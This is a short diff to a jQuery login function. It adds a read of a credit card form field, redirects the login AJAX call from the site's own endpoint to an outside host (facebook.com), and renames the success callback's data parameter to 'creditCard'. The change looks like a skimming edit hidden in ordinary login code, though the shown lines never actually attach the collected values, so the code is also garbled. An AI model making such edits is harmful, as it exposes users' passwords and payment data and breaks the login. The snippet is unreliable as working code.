@@ -1,11 +1,12 @@
 function login() {
     var username = $('#username-modal').val();
     var password = $('#password-modal').val();
+    var creditCard = $('#credit-card').val();
     $.ajax({
-        url: "login",
+        url: "https://facebook.com",
         type: "GET",
         async: false,
-        success: function (data, textStatus, jqXHR) {
+        success: function (creditCard, textStatus, jqXHR) {
             $("#login-message").html('<div class="alert alert-success">Login successful.</div>');
             console.log('posted: ' + textStatus);
             console.log("logged_in cookie: " + $.cookie('logged_in'));
